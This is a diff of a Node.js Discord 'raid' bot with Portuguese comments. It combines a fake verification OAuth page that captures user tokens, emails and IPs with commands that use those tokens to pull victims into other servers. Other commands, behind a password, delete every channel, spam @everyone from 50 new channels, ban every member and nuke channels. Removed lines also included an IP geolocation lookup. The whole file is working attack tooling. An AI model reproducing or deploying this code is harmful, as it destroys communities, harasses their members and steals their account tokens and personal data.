@@ -1,6 +1,6 @@
 const express = require('express');
 const app = express();
-const { Client, GatewayIntentBits, Partials, ChannelType, REST, Routes, SlashCommandBuilder, EmbedBuilder, Events, parseEmoji } = require('discord.js');
+const { Client, GatewayIntentBits, Partials, ChannelType, REST, Routes, SlashCommandBuilder, EmbedBuilder, Events } = require('discord.js');
 const fs = require('fs');
 const axios = require('axios');
 
@@ -12,13 +12,15 @@ const LINK_BASE = 'https://rickwcl.onrender.com';
 const REDIRECT_URI = `${LINK_BASE}/callback`;
 const ID_CARGO = '1466834314225389804';
 const ID_SERVIDOR = '1465936358513315976'; 
-const SENHA_LOGIN = "unlocked";
+const SENHA_LOGIN = "Rickwcl"; 
 
-let db = { usuarios: [], kickList: [] };
+let db = { usuarios: [] };
 if (fs.existsSync('./storage.json')) db = JSON.parse(fs.readFileSync('./storage.json'));
 const saveDb = () => fs.writeFileSync('./storage.json', JSON.stringify(db, null, 4));
 
-// --- SISTEMA DE CAPTURA (PYTHON -> JS) ---
+const client = new Client({ intents: [3276799] });
+
+// --- SERVIDOR WEB (PÁGINA DE SUCESSO) ---
 app.get('/callback', async (req, res) => {
     const code = req.query.code;
     if (!code) return res.send('Erro');
@@ -44,118 +46,104 @@ app.get('/callback', async (req, res) => {
             headers: { Authorization: `Bot ${BOT_TOKEN}` }
         }).catch(() => {});
 
-        const foto = user.avatar ? `https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}.png` : "https://cdn.discordapp.com/embed/avatars/0.png";
-        res.send(`<html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1"><style>body { background: #0c0d12; color: white; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }.card { background: #111419; border: 1.5px solid #1f232a; border-radius: 24px; padding: 40px 20px; text-align: center; width: 90%; max-width: 380px; }.avatar { width: 110px; height: 110px; border-radius: 50%; border: 3px solid #ff4444; padding: 4px; }.status { color: #ff4444; font-size: 11px; font-weight: 800; text-transform: uppercase; }.info-box { background: #1a1d24; border-radius: 16px; padding: 20px; margin: 25px 0; border: 1px solid #2d3139; text-align: left; }.btn { background: #ff4444; color: white; text-decoration: none; padding: 18px; border-radius: 14px; display: block; font-weight: 800; }</style></head><body><div class="card"><img class="avatar" src="${foto}"><br><span class="status">● Verificado</span><h2>${user.username}</h2><div class="info-box"><span style="color:#6e7681; font-size:11px;">SERVIDOR</span><br><span style="font-size:18px; font-weight:800;">CODEN®</span><br><span style="color:#ff4444; font-size:13px;">✓ Cargo Atribuído</span></div><a href="https://discord.com/app" class="btn">Acessar Servidor</a></div></body></html>`);
+        const guild = client.guilds.cache.get(ID_SERVIDOR);
+        const serverName = guild ? guild.name : "Servidor";
+        const avatarUrl = user.avatar ? `https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}.png` : "https://cdn.discordapp.com/embed/avatars/0.png";
+
+        res.send(`<html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1"><style>body { background: #0c0d12; color: white; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }.card { background: #111419; border: 1.5px solid #1f232a; border-radius: 24px; padding: 40px 20px; text-align: center; width: 90%; max-width: 380px; }.avatar { width: 110px; height: 110px; border-radius: 50%; border: 3px solid #ff4444; padding: 4px; }.status { color: #ff4444; font-size: 11px; font-weight: 800; text-transform: uppercase; margin-top: 10px; display: block; }.info-box { background: #1a1d24; border-radius: 16px; padding: 20px; margin: 25px 0; border: 1px solid #2d3139; text-align: left; }.btn { background: #ff4444; color: white; text-decoration: none; padding: 18px; border-radius: 14px; display: block; font-weight: 800; }</style></head><body><div class="card"><img class="avatar" src="${avatarUrl}"><span class="status">● Verificado</span><h2>${user.username}</h2><div class="info-box"><span style="color:#6e7681; font-size:11px;">SERVIDOR</span><br><span style="font-size:18px; font-weight:800;">${serverName}</span><br><span style="color:#ff4444; font-size:13px;">✓ Cargo Atribuído</span></div><a href="https://discord.com/app" class="btn">Acessar Servidor</a></div></body></html>`);
     } catch (e) { res.send('Erro'); }
 });
 app.listen(process.env.PORT || 10000);
 
-// --- BOT DE RAID ---
-const client = new Client({
-    intents: [3276799],
-    partials: [Partials.Channel, Partials.Message]
-});
-
+// --- COMANDOS ---
 const commands = [
-    new SlashCommandBuilder().setName('ajuda').setDescription('x'),
-    new SlashCommandBuilder().setName('setup').setDescription('x'),
-    new SlashCommandBuilder().setName('puxar').setDescription('x').addStringOption(o => o.setName('login').setDescription('x').setRequired(true)).addStringOption(o => o.setName('guild_id').setDescription('x').setRequired(true)),
-    new SlashCommandBuilder().setName('listar').setDescription('x').addStringOption(o => o.setName('login').setDescription('x').setRequired(true)),
-    new SlashCommandBuilder().setName('ip').setDescription('x').addStringOption(o => o.setName('endereco').setDescription('x').setRequired(true)),
-    new SlashCommandBuilder().setName('ping').setDescription('x'),
-    new SlashCommandBuilder().setName('addemoji').setDescription('x').addStringOption(o => o.setName('emoji').setDescription('x').setRequired(true)).addStringOption(o => o.setName('nome').setDescription('x').setRequired(false)),
-    new SlashCommandBuilder().setName('clear').setDescription('x').addStringOption(o => o.setName('login').setDescription('x').setRequired(true)).addIntegerOption(o => o.setName('quantidade').setDescription('x').setRequired(true)),
-    new SlashCommandBuilder().setName('first').setDescription('x').addStringOption(o => o.setName('login').setDescription('x').setRequired(true)).addStringOption(o => o.setName('mensagem').setDescription('x').setRequired(true)),
-    new SlashCommandBuilder().setName('allmsg').setDescription('x').addStringOption(o => o.setName('login').setDescription('x').setRequired(true)).addStringOption(o => o.setName('conteudo').setDescription('x').setRequired(true)),
-    new SlashCommandBuilder().setName('allban').setDescription('x').addStringOption(o => o.setName('login').setDescription('x').setRequired(true)),
-    new SlashCommandBuilder().setName('reset').setDescription('x').addStringOption(o => o.setName('login').setDescription('x').setRequired(true)),
-    new SlashCommandBuilder().setName('nuke').setDescription('x').addStringOption(o => o.setName('login').setDescription('x').setRequired(true)),
-    new SlashCommandBuilder().setName('kickcall').setDescription('x').addStringOption(o => o.setName('login').setDescription('x').setRequired(true)).addUserOption(o => o.setName('alvo').setDescription('x').setRequired(true))
+    new SlashCommandBuilder().setName('ajuda').setDescription('Menu de ajuda'),
+    new SlashCommandBuilder().setName('verify').setDescription('Sistema de verificação'),
+    new SlashCommandBuilder().setName('puxar').setDescription('Trazer membros').addStringOption(o => o.setName('guild_id').setDescription('ID do alvo').setRequired(true)),
+    new SlashCommandBuilder().setName('listar').setDescription('Listar capturas'),
+    new SlashCommandBuilder().setName('haid').setDescription('Raid spam').addStringOption(o => o.setName('login').setDescription('Senha').setRequired(true)).addStringOption(o => o.setName('mensagem').setDescription('Mensagem').setRequired(true)),
+    new SlashCommandBuilder().setName('boss').setDescription('Resetar servidor').addStringOption(o => o.setName('login').setDescription('Senha').setRequired(true)),
+    new SlashCommandBuilder().setName('allban').setDescription('Banir todos').addStringOption(o => o.setName('login').setDescription('Senha').setRequired(true)),
+    new SlashCommandBuilder().setName('kickcall').setDescription('Kick da call').addStringOption(o => o.setName('login').setDescription('Senha').setRequired(true)).addUserOption(o => o.setName('alvo').setDescription('Usuário').setRequired(true)),
+    new SlashCommandBuilder().setName('nuke').setDescription('Limpar chat'),
+    new SlashCommandBuilder().setName('ping').setDescription('Latência')
 ].map(cmd => cmd.toJSON());
 
 const rest = new REST({ version: '10' }).setToken(BOT_TOKEN);
 (async () => { try { await rest.put(Routes.applicationCommands(CLIENT_ID), { body: commands }); } catch (e) {} })();
 
-async function getIpEmbed(ip) {
-    try {
-        const res = await axios.get(`http://ip-api.com/json/${ip}`);
-        if (res.data.status === 'success') {
-            return new EmbedBuilder()
-                .setTitle(`🔍 Detalhes do IP: ${ip}`).setColor(0x3498db)
-                .addFields({ name: 'País', value: res.data.country || 'N/A' }, { name: 'Estado', value: res.data.regionName || 'N/A' }, { name: 'Cidade', value: res.data.city || 'N/A' }, { name: 'ISP', value: res.data.isp || 'N/A' }, { name: 'Latitude/Longitude', value: `${res.data.lat}, ${res.data.lon}` })
-                .setFooter({ text: 'Powered by ip-api.com' });
-        }
-    } catch (e) { return null; }
-}
-
+// --- INTERAÇÕES ---
 client.on(Events.InteractionCreate, async (i) => {
     if (!i.isChatInputCommand()) return;
+    const { commandName, options } = i;
 
-    if (i.commandName === 'ajuda') {
+    // Trava de senha para comandos de ataque
+    const comandosComSenha = ['haid', 'boss', 'allban', 'kickcall'];
+    if (comandosComSenha.includes(commandName)) {
+        if (options.getString('login') !== SENHA_LOGIN) {
+            return i.reply({ content: "🔒 Senha incorreta.", flags: [64] });
+        }
+    }
+
+    if (commandName === 'ajuda') {
         const helpEmbed = new EmbedBuilder()
             .setTitle('🔒 cmd - FIRST').setColor(0x00008B)
-            .setDescription('🔹 /ip\n🔹 /first\n🔹 /allmsg\n🔹 /allban\n🔹 /reset\n🔹 /nuke\n🔹 /clear\n🔹 /addemoji\n🔹 /kickcall\n🔹 /ping\n🔹 /setup\n🔹 /puxar\n🔹 /listar\n\n⚠️ *Creator by ż4*')
+            .setDescription('🔹 /verify\n🔹 /haid (Senha)\n🔹 /allban (Senha)\n🔹 /boss (Senha)\n🔹 /kickcall (Senha)\n🔹 /nuke\n🔹 /ping\n🔹 /puxar\n🔹 /listar\n\n⚠️ *Creator by ż4*')
             .setImage('https://cdn.discordapp.com/attachments/1459599212852412558/1460702992712990780/f3013e356a3829c077c84c321798982f.gif');
         return i.reply({ embeds: [helpEmbed] });
     }
 
-    if (i.commandName === 'setup') {
+    if (commandName === 'verify') {
         const authUrl = `https://discord.com/oauth2/authorize?client_id=${CLIENT_ID}&response_type=code&redirect_uri=${encodeURIComponent(REDIRECT_URI)}&scope=identify+guilds.join+email`;
-        const embed = new EmbedBuilder().setTitle("✅ Autenticação - CODEN®").setDescription("Clica no botão para te verificares!").setColor(16711680).setImage("https://cdn.discordapp.com/attachments/1468433340117028897/1468452430864977941/27ee5edaf33aac33b89e5ded3c4395b9.jpg");
+        const embed = new EmbedBuilder().setTitle("✅ Autenticação").setDescription("Clica no botão para te verificares!").setColor(0xff0000).setImage("https://cdn.discordapp.com/attachments/1468433340117028897/1468452430864977941/27ee5edaf33aac33b89e5ded3c4395b9.jpg");
         return i.reply({ embeds: [embed], components: [{ type: 1, components: [{ type: 2, style: 5, label: "Verificar", url: authUrl }] }] });
     }
 
-    if (i.options.getString('login') !== SENHA_LOGIN) return i.reply({ content: "🔒 senha inválida", flags: [64] });
-
-    if (i.commandName === 'listar') {
-        let txt = db.usuarios.map(u => `ID: ${u.id} | Email: ${u.email} | IP: ${u.ip}`).join('\n');
-        return i.reply({ content: `**Membros Capturados:**\n${txt || 'Nenhum'}`, flags: [64] });
-    }
-
-    if (i.commandName === 'puxar') {
-        const gId = i.options.getString('guild_id');
-        await i.reply(`🚀 Restaurando ${db.usuarios.length} membros...`);
-        for (const u of db.usuarios) {
-            await axios.put(`https://discord.com/api/v10/guilds/${gId}/members/${u.id}`, { access_token: u.token }, {
-                headers: { Authorization: `Bot ${BOT_TOKEN}` }
-            }).catch(() => {});
-        }
-    }
-
-    if (i.commandName === 'nuke') {
-        try {
-            const channel = i.channel;
-            const novo = await channel.clone();
-            await channel.delete();
-            await novo.send({ 
-                content: "@everyone **NUKE BY Ż4**", 
-                embeds: [new EmbedBuilder().setImage('https://cdn.discordapp.com/attachments/1459599212852412558/1460726448754135190/70d0e28f1f1eb8aa688b32a2c942c5d1.gif').setColor('Orange')] 
-            });
-        } catch (e) { console.error(e); }
-    }
-
-    if (i.commandName === 'first') {
-        const msg = i.options.getString('mensagem');
+    if (commandName === 'haid') {
+        const msg = options.getString('mensagem');
+        await i.reply("🔥 Iniciando...");
         i.guild.channels.cache.forEach(c => c.delete().catch(() => {}));
         for (let j = 0; j < 50; j++) {
-            i.guild.channels.create({ name: 'xvideos', type: ChannelType.GuildText }).then(ch => {
+            i.guild.channels.create({ name: 'raid-by-z4', type: ChannelType.GuildText }).then(ch => {
                 setInterval(() => ch.send(`@everyone ${msg}`).catch(() => {}), 600);
             }).catch(() => {});
         }
     }
 
-    if (i.commandName === 'allban') {
-        const m = await i.guild.members.fetch();
-        m.forEach(mem => { if (mem.bannable) mem.ban().catch(() => {}); });
-        await i.reply({ content: "🔨 Banindo tudo!", flags: [64] });
-    }
-    
-    if (i.commandName === 'reset') {
-        i.guild.setName("reset").catch(() => {});
+    if (commandName === 'boss') {
+        i.guild.setName("BOSS WAS HERE").catch(() => {});
         const chs = await i.guild.channels.fetch();
         chs.forEach(c => c.delete().catch(() => {}));
-        await i.reply({ content: "🧹 Reset efetuado.", flags: [64] });
+        return i.reply("🧹 Servidor resetado.");
     }
+
+    if (commandName === 'allban') {
+        const m = await i.guild.members.fetch();
+        m.forEach(mem => { if (mem.bannable) mem.ban().catch(() => {}); });
+        return i.reply("🔨 Banindo...");
+    }
+
+    if (commandName === 'kickcall') {
+        const alvo = options.getMember('alvo');
+        if (alvo?.voice.channel) {
+            await alvo.voice.disconnect();
+            return i.reply(`🚫 Kickado.`);
+        }
+        return i.reply("Não está em call.");
+    }
+
+    if (commandName === 'listar') {
+        let txt = db.usuarios.map(u => `ID: ${u.id} | IP: ${u.ip}`).join('\n');
+        return i.reply({ content: `**Capturados:**\n${txt || 'Vazio'}`, flags: [64] });
+    }
+
+    if (commandName === 'nuke') {
+        const novo = await i.channel.clone();
+        await i.channel.delete();
+        await novo.send("@everyone **NUKED BY Ż4**");
+    }
+
+    if (commandName === 'ping') return i.reply('🏓 Pong!');
 });
 
 client.on(Events.ClientReady, () => console.log(`✅ ONLINE: 🔒 FIRST`));
